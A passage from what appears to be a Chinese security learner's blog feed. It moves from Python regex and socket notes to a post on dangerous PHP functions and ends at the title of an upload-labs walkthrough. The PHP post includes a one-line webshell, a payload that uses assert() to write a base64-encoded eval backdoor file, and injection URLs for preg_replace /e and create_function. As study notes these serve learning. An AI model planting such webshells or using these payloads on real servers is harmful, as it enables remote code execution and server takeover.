class=\"line\">...</span><br><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;r2d2|c3po&#x27;, &#x27;r2d2&#x27;)</span><br><span class=\"line\">#匹配&#x27;r2d2&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;r2d2&#x27;</span><br></pre></td></tr></table></figure>\n<p><strong>sub ()（和 subn ()）进行搜索和替换</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; re.sub(&#x27;X&#x27;, &#x27;Mr. Smith&#x27;, &#x27;attn: X\\n\\nDear X,\\n&#x27;)</span><br><span class=\"line\">&#x27;attn: Mr. Smith\\<span class=\"number\">012</span>\\<span class=\"number\">012</span>Dear Mr. Smith,\\<span class=\"number\">012</span>&#x27;</span><br><span class=\"line\">&gt;&gt;&gt;</span><br><span class=\"line\">&gt;&gt;&gt; re.subn(&#x27;X&#x27;, &#x27;Mr. Smith&#x27;, &#x27;attn: X\\n\\nDear X,\\n&#x27;)</span><br><span class=\"line\">(&#x27;attn: Mr. Smith\\<span class=\"number\">012</span>\\<span class=\"number\">012</span>Dear Mr. Smith,\\<span class=\"number\">012</span>&#x27;, <span class=\"number\">2</span>)</span><br><span class=\"line\">&gt;&gt;&gt;</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"built_in\">print</span> re.sub(&#x27;X&#x27;, &#x27;Mr. Smith&#x27;, &#x27;attn: X\\n\\nDear X,\\n&#x27;)</span><br><span class=\"line\"><span class=\"function\">attn: <span class=\"title\">Mr</span>. <span class=\"title\">Smith</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Dear</span> <span class=\"title\">Mr</span>. <span class=\"title\">Smith</span>,</span></span><br><span class=\"line\"><span class=\"function\">&gt;&gt;&gt; <span class=\"title\">re.sub</span>(&#x27;[<span class=\"title\">ae</span>]&#x27;, &#x27;<span class=\"title\">X</span>&#x27;, &#x27;<span class=\"title\">abcdef</span>&#x27;)</span></span><br><span class=\"line\"><span class=\"function\">&#x27;<span class=\"title\">XbcdXf</span>&#x27;</span></span><br><span class=\"line\"><span class=\"function\">&gt;&gt;&gt; <span class=\"title\">re.subn</span>(&#x27;[<span class=\"title\">ae</span>]&#x27;, &#x27;<span class=\"title\">X</span>&#x27;, &#x27;<span class=\"title\">abcdef</span>&#x27;)</span></span><br><span class=\"line\"><span class=\"function\">(&#x27;<span class=\"title\">XbcdXf</span>&#x27;, 2)</span></span><br></pre></td></tr></table></figure>\n<p><strong>用 split () 分割</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; re.split(&#x27;:&#x27;, &#x27;str1:str2:str3&#x27;)</span><br><span class=\"line\">[&#x27;str1&#x27;, &#x27;str2&#x27;, &#x27;str3&#x27;]</span><br></pre></td></tr></table></figure>\n<h2 id=\"python-网络编程\"><a class=\"markdownIt-Anchor\" href=\"#python-网络编程\">#</a> <strong>python 网络编程</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121171535369.png\" alt=\"image-20201121171535369\"></strong></p>\n<p><strong>创建 tcp 服务器</strong></p>\n<h2 id=\"tcp时间戳服务器tstservpy\"><a class=\"markdownIt-Anchor\" href=\"#tcp时间戳服务器tstservpy\">#</a> <strong>TCP 时间戳服务器（<span class=\"exturl\" data-url=\"aHR0cDovL3RzVHNlcnYucHk=\">tsTserv.py</span>）</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121171731015.png\" alt=\"image-20201121171731015\"></strong></p>\n<p><strong>TCP 客户端</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121171852321.png\" alt=\"image-20201121171852321\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121171924713.png\" alt=\"image-20201121171924713\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121171931438.png\" alt=\"image-20201121171931438\"></strong></p>\n<h2 id=\"udp时间戳服务器tsuservpy\"><a class=\"markdownIt-Anchor\" href=\"#udp时间戳服务器tsuservpy\">#</a> <strong>UDP 时间戳服务器（<span class=\"exturl\" data-url=\"aHR0cDovL3RzVXNlcnYucHk=\">tsUserv.py</span>）</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121172044894.png\" alt=\"image-20201121172044894\"></strong></p>\n<p><strong>UDP 客户端（<span class=\"exturl\" data-url=\"aHR0cDovL3RzVWNsbnQucHk=\">tsUclnt.py</span>）</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121172216173.png\" alt=\"image-20201121172216173\"></strong></p>\n<h2 id=\"socket模块属性\"><a class=\"markdownIt-Anchor\" href=\"#socket模块属性\">#</a> <strong>socket 模块属性</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121172346313.png\" alt=\"image-20201121172346313\"></strong></p>\n<h2 id=\"socketserver-模块\"><a class=\"markdownIt-Anchor\" href=\"#socketserver-模块\">#</a> <strong>SocketServer 模块</strong></h2>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aseServer</span><br><span class=\"line\">包含服务器的核心功能与混合（mix-<span class=\"keyword\">in</span>）类挂钩；这个类只用于派生，所以不</span><br><span class=\"line\">会生成这个类的实例；可以考虑使用 TCPServer 和 UDPServer</span><br><span class=\"line\">TCPServer/UDPServer</span><br><span class=\"line\">基本的网络同步 TCP/UDP 服务器</span><br><span class=\"line\">UnixStreamServer/ UnixDatagramServer</span><br><span class=\"line\">基本的基于文件同步 TCP/UDP 服务器</span><br><span class=\"line\">ForkingMixIn/ ThreadingMixIn</span><br><span class=\"line\">实现了核心的进程化或线程化的功能；作为混合类，与服务器类一并使用以</span><br><span class=\"line\">提供一些异步特性；这个类不会直接实例化</span><br><span class=\"line\">ForkingTCPServer/ ForkingUDPServer</span><br><span class=\"line\">ForkingMixIn 和 TCPServer/UDPServer 的组合</span><br><span class=\"line\">ThreadingTCPServer/ ThreadingUDPServer</span><br><span class=\"line\">ThreadingMixIn 和 TCPServer/UDPServer 的组合</span><br><span class=\"line\">BaseRequestHandler</span><br><span class=\"line\">包含处理服务请求的核心功能。这个类只用于派生，所以不会生成这个类的</span><br><span class=\"line\">实例可以考虑使用 StreamRequestHandler 或 DatagramRequestHandler</span><br><span class=\"line\">StreamRequestHandler/ DatagramRequestHandler</span><br><span class=\"line\">用于 TCP/UDP 服务器的服务处理工具</span><br></pre></td></tr></table></figure>\n<h2 id=\"socketserver-时间戳-tcp-服务器tstservsspy\"><a class=\"markdownIt-Anchor\" href=\"#socketserver-时间戳-tcp-服务器tstservsspy\">#</a> <strong>SocketServer 时间戳 TCP 服务器（<span class=\"exturl\" data-url=\"aHR0cDovL1RzVHNlcnZzcy5weQ==\">TsTservss.py</span>）</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121174422386.png\" alt=\"image-20201121174422386\"></strong></p>\n<p><strong>SocketServer 时间戳 TCP 客户端（<span class=\"exturl\" data-url=\"aHR0cDovL3RzVGNsbnRTUy5weQ==\">tsTclntSS.py</span>)</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121174605619.png\" alt=\"image-20201121174605619\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121174702083.png\" alt=\"image-20201121174702083\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121174709293.png\" alt=\"image-20201121174709293\"></strong></p>\n",
            "tags": []
        },
        {
            "id": "http://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/",
            "url": "http://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/",
            "title": "php危险函数",
            "date_published": "2021-05-04T04:34:41.000Z",
            "content_html": "<h2 id=\"php常见危险函数\"><a class=\"markdownIt-Anchor\" href=\"#php常见危险函数\">#</a> PHP 常见危险函数</h2>\n<h3 id=\"eval函数\"><a class=\"markdownIt-Anchor\" href=\"#eval函数\">#</a> eval () 函数</h3>\n<p>定义和用法：</p>\n<p>eval () 函数把字符串按照 PHP 代码来计算.<br>\n 该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$var</span> = <span class=\"string\">&quot;var&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;cmd&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$arg</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;cmd&quot;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">eval</span>(<span class=\"string\">&quot;\\$var = <span class=\"subst\">$arg</span>;&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\$var =&quot;</span>.<span class=\"variable\">$var</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png\" alt=\"image-20210503102521525\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png\" alt=\"image-20210503102807857\"></p>\n<h3 id=\"assert函数\"><a class=\"markdownIt-Anchor\" href=\"#assert函数\">#</a> <strong>assert () 函数</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</span><br><span class=\"line\">判断一个表达式是否成立。返回true or false。</span><br><span class=\"line\">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>\n<p>一般情况下，黑名单都会禁用 <code>eval()</code>  函数，所以用 <code>assert</code>  来代替 eval 来执行具体操作。</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png\" alt=\"image-20210503103001094\"></p>\n<h3 id=\"assertion函数\"><a class=\"markdownIt-Anchor\" href=\"#assertion函数\">#</a> assertion 函数</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">检查一个断言是否为 FALSE。</span><br><span class=\"line\">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</span><br><span class=\"line\">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>\n<p>构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php $_GET[a]($_GET[b]);?&gt;  &#x2F;&#x2F;一句话木马</span><br><span class=\"line\">&#x2F;&#x2F;payload： ?a&#x3D;assert&amp;b&#x3D;&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"preg_replace函数\"><a class=\"markdownIt-Anchor\" href=\"#preg_replace函数\">#</a> <strong>preg_replace () 函数</strong></h3>\n<p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$pattern</span> = <span class=\"variable\">$_GET</span>[pat];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$replacement</span> = <span class=\"variable\">$_GET</span>[rep];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$subject</span> = <span class=\"variable\">$_GET</span>[sub];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$pattern</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$replacement</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$subject</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpreg_replace(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$replacement</span>, <span class=\"variable\">$subject</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;phpinfo()&amp;sub&#x3D;jutst test</span><br><span class=\"line\">也可以为</span><br><span class=\"line\">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;var_dump(&#96;net user&#96;)&amp;sub&#x3D;jutst test</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。</span><br></pre></td></tr></table></figure>\n<h3 id=\"create_function函数\"><a class=\"markdownIt-Anchor\" href=\"#create_function函数\">#</a> create_function () 函数</h3>\n<p>string create_function ( string $args , string $code )<br>\n 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$sort_by</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sort_by&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$sorter</span> = <span class=\"string\">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$databases</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;1234&#x27;</span>,<span class=\"string\">&#x27;4321&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$sort_function</span> = <span class=\"string\">&#x27; return 1 * &#x27;</span> . <span class=\"variable\">$sorter</span> . <span class=\"string\">&#x27;($a[&quot;&#x27;</span> . <span class=\"variable\">$sort_by</span> . <span class=\"string\">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class=\"variable\">$sort_by</span> . <span class=\"string\">&#x27;&quot;]);&#x27;</span>;</span><br><span class=\"line\">usort(<span class=\"variable\">$databases</span>, create_function(<span class=\"string\">&#x27;$a, $b&#x27;</span>, <span class=\"variable\">$sort_function</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>构造匿名函数原型</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span> * <span class=\"string\">&#x27; . $sorter . &#x27;</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&quot;&#x27; . <span class=\"subst\">$sort_by</span> . &#x27;&quot;</span>], <span class=\"variable\">$b</span>[<span class=\"string\">&quot;&#x27; . <span class=\"subst\">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>构造 payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;test3.php?sort_by&#x3D;%27%22]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png\" alt=\"image-20210503104641807\"></p>\n<h3 id=\"call_user_func函数\"><a class=\"markdownIt-Anchor\" href=\"#call_user_func函数\">#</a> call_user_func 函数</h3>\n<p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>\n 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"variable\">$filter</span>= <span class=\"string\">&#x27;assert&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$value</span> = <span class=\"string\">&#x27;phpinfo()&#x27;</span>;</span><br><span class=\"line\">    call_user_func(<span class=\"variable\">$filter</span>, <span class=\"variable\">$value</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503111406856.png\" alt=\"image-20210503111406856\"></p>\n<h3 id=\"call_user_func_array函数\"><a class=\"markdownIt-Anchor\" href=\"#call_user_func_array函数\">#</a> call_user_func_array 函数</h3>\n<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</span><br></pre></td></tr></table></figure>\n<h2 id=\"命令执行函数\"><a class=\"markdownIt-Anchor\" href=\"#命令执行函数\">#</a> 命令执行函数</h2>\n<ul>\n<li>exec ()  执行一个外部程序</li>\n<li>passthru ()  执行外部程序并且显示原始输出</li>\n<li>proc_open ()  执行一个命令，并且打开用来输入 / 输出的文件指针</li>\n<li>shell_exec ()  通过 shell 环境执行命令，将完整的输出以字符串方式返回</li>\n<li>system ()  执行外部程序，并且显示输出</li>\n<li>popen ()  通过 popen () 的参数传递一条命令，并对 popen () 所打开的文件进行执行</li>\n<li>escapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符转义</li>\n</ul>\n<h2 id=\"包含函数\"><a class=\"markdownIt-Anchor\" href=\"#包含函数\">#</a> 包含函数</h2>\n<p>require、include、require_once、include_once<br>\n 包含函数 一共有四个，主要作用为包含并运行指定文件。</p>\n<ul>\n<li>require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 (E_COMPILE_ERROR) 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。</li>\n<li>include 语句包含并运行指定文件</li>\n<li>require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</li>\n<li><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmluY2x1ZGUucGhw\">include</span> 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。</li>\n</ul>\n<h2 id=\"文件操作函数官方文档\"><a class=\"markdownIt-Anchor\" href=\"#文件操作函数官方文档\">#</a> 文件操作函数 (官方文档)</h2>\n<ul>\n<li>copy  拷贝文件 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmNvcHkucGhw\">http://php.net/manual/zh/function.copy.php</span></li>\n<li>file_get_contents  将整个文件读入一个字符串 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==\">http://php.net/manual/zh/function.file-get-contents.php</span></li>\n<li>file_put_contents  将一个字符串写入文件  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtcHV0LWNvbnRlbnRzLnBocA==\">http://php.net/manual/zh/function.file-put-contents.php</span></li>\n<li>file  把整个文件读入到一个数组中 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUucGhw\">http://php.net/manual/zh/function.file.php</span></li>\n<li>fopen  打开文件或者 URL  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZvcGVuLnBocA==\">http://php.net/manual/zh/function.fopen.php</span></li>\n<li>move_uploaded_file 将上传的文件移动到新位置 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLm1vdmUtdXBsb2FkZWQtZmlsZS5waHA=\">http://php.net/manual/zh/function.move-uploaded-file.php</span></li>\n<li>readfile  输出文件 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlYWRmaWxlLnBocA==\">http://php.net/manual/zh/function.readfile.php</span></li>\n<li>rename  重命名一个文件目录 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlbmFtZS5waHA=\">http://php.net/manual/zh/function.rename.php</span></li>\n<li>rmdir  删除目录 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJtZGlyLnBocA==\">http://php.net/manual/zh/function.rmdir.php</span></li>\n<li>unlink &amp; delete  删除文件  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnVubGluay5waHA=\">http://php.net/manual/zh/function.unlink.php</span></li>\n</ul>\n<h2 id=\"特殊函数\"><a class=\"markdownIt-Anchor\" href=\"#特殊函数\">#</a> 特殊函数</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phpinfo — 输出关于 PHP 配置的信息</span><br><span class=\"line\">symlink — 建立符号连接</span><br><span class=\"line\">readlink — 返回符号连接指向的目标</span><br><span class=\"line\">getenv — 获取一个环境变量的值</span><br><span class=\"line\">putenv — 设置环境变量的值</span><br><span class=\"line\">dl — 运行时载入一个 PHP 扩展</span><br><span class=\"line\">ini_get — 获取一个配置选项的值</span><br><span class=\"line\">ini_set  ini_alter  ini_restore</span><br><span class=\"line\">is_numeric - 数字判断 </span><br><span class=\"line\">in_array 在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量覆盖\"><a class=\"markdownIt-Anchor\" href=\"#变量覆盖\">#</a> 变量覆盖</h3>\n<ul>\n<li>parse_str 如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</li>\n<li>extract  本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</li>\n<li>mb_parse_str  解析 GET/POST/COOKIE 数据并设置全局变量。</li>\n<li>import_request_variables  将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</li>\n</ul>\n<p>列目录</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">glob</span><br><span class=\"line\"><span class=\"keyword\">array</span> glob ( <span class=\"keyword\">string</span> <span class=\"variable\">$pattern</span> [, <span class=\"keyword\">int</span> <span class=\"variable\">$flags</span> = <span class=\"number\">0</span> ] )</span><br><span class=\"line\">glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般 shells 所用的规则一样。不进行缩写扩展或参数替代。</span><br></pre></td></tr></table></figure>\n<h3 id=\"无参数获取信息\"><a class=\"markdownIt-Anchor\" href=\"#无参数获取信息\">#</a> 无参数获取信息</h3>\n<ul>\n<li>get_defined_vars 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</li>\n<li>get_defined_constants 返回当前所有已定义的常量名和值。 这包含 define () 函数所创建的，也包含了所有扩展所创建的。</li>\n<li>get_defined_functions 返回一个包含所有已定义函数列表的多维数组</li>\n<li>get_included_files 返回所有被 include、 include_once、 require 和 require_once 的文件名。</li>\n</ul>\n<p>php 危险函数总结</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135420288.png\" alt=\"image-20210503135420288\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135446595.png\" alt=\"image-20210503135446595\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135503196.png\" alt=\"image-20210503135503196\"></p>\n",
            "tags": [
                "php危险函数"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "url": "http://chungod.github.io/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "title": "upload-labs通关记录",
